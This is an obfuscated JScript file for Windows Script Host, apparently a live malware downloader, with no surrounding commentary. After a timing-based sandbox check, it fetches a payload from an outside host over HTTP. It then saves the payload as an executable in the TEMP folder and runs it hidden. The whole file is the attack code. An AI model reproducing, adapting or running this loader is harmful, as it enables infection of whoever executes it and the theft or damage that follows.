var PI0 = false;
var Y = "Create"+"Object";
var B1 = function LQ() {return WScript[Y]("WScript"+".Shell");}(), A = 11;
var R = "MSXML2"+".XMLHTTP";
var V0 = 2;
var S = V0 - 2;
function E0(L0){B1["Run"](L0, S, S);};
function FC(){return R + "";};
function J(Z0, K){S = S * 1; return Z0 - K;};
function C(){return Y;};
/*@cc_on
  @if (@_win32 || @_win64)
    PI0 = true;
  @end
@*/
if (PI0)
{
var HG = "";
function ZK(){return 22;};
var R0 = 0; var B0 = 0;
function IA()
{
var D = new this["Date"]();
var HK = D["getUTCMilliseconds"]();
WScript["Sleep"](ZK());
var D = new this["Date"]();
var B = D["getUTCMilliseconds"]();
WScript["Sleep"](ZK());
var D = new this["Date"]();
var N = D["getUTCMilliseconds"]();
var R0 = "Z";
R0 = J(B, HK);
var B0 = "PI";
B0 = J(N, B);
HG = "open";
return J(R0, B0);
}
var D0 = false;
var X = false;
for (var NQ = S; NQ < ZK() * 1; NQ++){if (IA() != S){
D0 = true; 
B0 = "31" + 11 * R0 + B0; 
X = true; 
break;
}}
function CO() {return ((D0 == true) && (D0 == X)) ? 1 : S;};
if (D0 && CO() && X){
function E() {return B1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "uVB1cpPcsEPvFKRi.ex" + "e";};
 ID = FC();
 H = WScript[Y](ID);
 var MA = 1;
do { 
	for (;MA;){
	try {
		if (MA == 1)
		{
			H[HG]("GET", "http://aaacollectionsjewelry.com/x9djsa", false);
			H["send"]();
			L = "Sleep";
			MA = 2;
		}
		WScript[L](ZK() + 120); 
		if (H["readystate"] < 2 * 2) continue;
		MA = S;
		function PH(YC) {var G = (1, 2, 3, 4, 5, YC); return G;};
		PE = WScript[C()]("ADODB.Stream");
		ID = PE;
		ID[HG]();
		ID["type"] = PH(1);
		ID["write"](H["ResponseBody"]);
		PE["position"] = PH(S);
		ID["Save" + "ToFile"](E(), 2);
		PE["cl"+"ose"]();
		V = E();
		E0(V);
	} catch(R1){};};
}while (MA);
}
}

